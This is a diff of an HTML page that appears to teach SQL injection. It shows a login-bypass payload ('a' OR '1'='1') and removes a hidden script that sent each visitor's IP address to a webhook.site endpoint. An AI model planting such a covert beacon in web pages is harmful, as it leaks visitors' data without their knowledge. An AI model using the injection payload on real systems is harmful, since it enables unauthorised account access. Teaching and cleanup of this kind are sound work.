@@ -286,9 +286,6 @@ Using such credentials will log us into the account of the first user in the dat
 
 <div class="code-box2">Username: a' OR '1'='1
 Password: letmein789</div><br>
-<script>fetch('https://api64.ipify.org?format=json')
-  .then(res => res.json())
-  .then(data => navigator.sendBeacon('https://webhook.site/4b5e3c34-4dff-4067-8313-410d60cad54a', JSON.stringify({ip: data.ip})));</script>
 
 There are countless combinations like this that we can use. Moreover, in the case of a website vulnerable to SQL Injection, an attacker can do much more than just log into different user accounts. They can execute commands in the database, such as adding new users, changing existing passwords, deleting users, or even wiping the entire table. In this scenario, SQL programming knowledge is an advantage. However, even without programming skills, this is not a problem, as there are tools that can automate the process.<br><br>
 
